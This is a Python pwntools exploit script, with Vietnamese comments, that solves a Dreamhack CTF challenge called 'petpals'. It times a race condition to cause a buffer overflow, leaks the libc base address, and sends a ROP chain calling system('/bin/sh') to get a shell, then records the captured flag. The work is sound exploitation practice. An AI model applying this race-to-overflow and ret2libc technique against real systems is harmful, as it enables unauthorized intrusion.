#!/usr/bin/python3
from pwn import * 
import time

exe = ELF('./petpals_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		brva 0x0000000000001875
		c
		''')

if args.REMOTE:
	HOST = 'host8.dreamhack.games'
	PORT = 16804
	p = remote(HOST, PORT)
else:
	p = process(exe.path)
#GDB()
deplay_time = 0
#input("Stage 1: Leak Libc") # Race condition
sla(b'> ', b'1')
sla(b'type: ', b'hamster')
sa(b'name: ', b'A' * 8)
sla(b'> ', b'2')
start_time = time.time() # tính thời gian chuong trình bắt đầu sleep
sl(b'1') #race condition
sla(b'type: ', b'cat')
sa(b'cat name: ', b'A' * 16 + p64(0x40 + 1)) # trigger BOF (ghi đè vào name_size của hamster) => bof mạnh hơn
sleep_time = 4.0 - (time.time() - start_time) + deplay_time # do_tre là thời gian độ trễ của mạng, send data đúng khoẳng khắc mà chương trình kết thúc ngủ
time.sleep(sleep_time) # đồng bộ với chương trình
sl(b'3')
sa(b'name: ', b'A' * 0x40)
sl(b'2')
data = rud(b' for a walk..').split(b'A' * 0x40)
libc.address = u64(data[1] + b'\0\0') - 0x29d90
info("Libc Base: ", libc.address)
time.sleep(6)
#input("Stage 2: Overwrite saved rip")
pop_rdi = libc.address + 0x2a3e5
bin_sh = next(libc.search(b'/bin/sh'))
sl(b'1')
sla(b'type: ', b'hamster')
sa(b'name: ', b'A' * 8)
sla(b'> ', b'2')
start_time = time.time()
sl(b'1')  # race condition
sla(b'type: ', b'cat')
sa(b'name: ', b'A' * 0x10 + p64(0x100 + 1))
sleep_time = 4.0 - (time.time() - start_time)
time.sleep(sleep_time)
sl(b'3')
pld = flat(
	b'A' * 0x40,
	pop_rdi,
	bin_sh,
	pop_rdi + 1,
	libc.sym.system,
	)
sa(b'name: ', pld)
sl(b'4')
p.interactive()
# DH{92f16794b557f78bf982b5379acb9a2eb0fef665fc93b5da1278c2e94064bbb1}
# tại sao lại phải đồng bộ ?
# tại vì cần hàm update_animals đúng thời điểm để thay đổi dữ liệu 
# race conditon ở hàm walk->start_routine => có thể sửa đổi size của name trong lúc chương trình usleeps => BOF
# muốn leak và get shell thì điều kiện tiên quyết là timing chuẩn